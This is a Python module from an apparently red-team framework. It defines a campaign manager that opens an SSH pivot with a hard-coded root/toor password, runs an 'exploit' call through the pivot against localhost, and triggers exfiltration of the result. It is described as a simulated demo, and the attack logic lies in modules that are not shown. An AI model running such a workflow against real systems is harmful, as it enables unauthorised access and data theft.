from typing import List, Dict
from ant_swarm.red.campaign import AutoRecon
from ant_swarm.red.human_link import HumanLink
from ant_swarm.red.loot_bag import LootBag
from ant_swarm.red.pivot import PivotTunnel
from rich.console import Console

console = Console()

class Strategist:
    """
    The Red Team Campaign Manager.
    INTEGRATED: Uses PivotTunnel for Lateral Movement (Real Sockets).
    """
    def __init__(self, recon: AutoRecon, pivot: PivotTunnel):
        self.recon = recon
        self.loot_bag = LootBag()
        self.pivot = pivot

    def execute_advanced_campaign(self):
        # 1. Breach DMZ (Simulated Pivot Setup)
        console.print("\n[STRATEGIST] 🎯 Phase 1: Establish SSH Pivot")
        # In a real campaign, we would exploit first. Here we assume creds found.
        # We try to add a pivot (simulated success flow since we lack SSH server in sandbox)
        self.pivot.add_ssh_pivot("127.0.0.1", "root", password="toor")

        # 2. Pivot to Core
        target_ip = "127.0.0.1" # Targeting self for demo
        target_port = 9999
        console.print(f"\n[STRATEGIST] 🎯 Phase 2: Lateral Movement to CORE ({target_ip}:{target_port})")

        # Attack Core via Pivot
        core_result = self.pivot.execute_remote(target_ip, target_port, "exploit")

        if "ACCESS GRANTED" in core_result:
            console.print(f"[STRATEGIST] 👑 KINGDOM KEYS ACQUIRED: {core_result}")
            self.loot_bag.queue_for_exfil(core_result)
            self.loot_bag.trigger_exfil()
        else:
            console.print(f"[STRATEGIST] ❌ Core Access Failed: {core_result}")
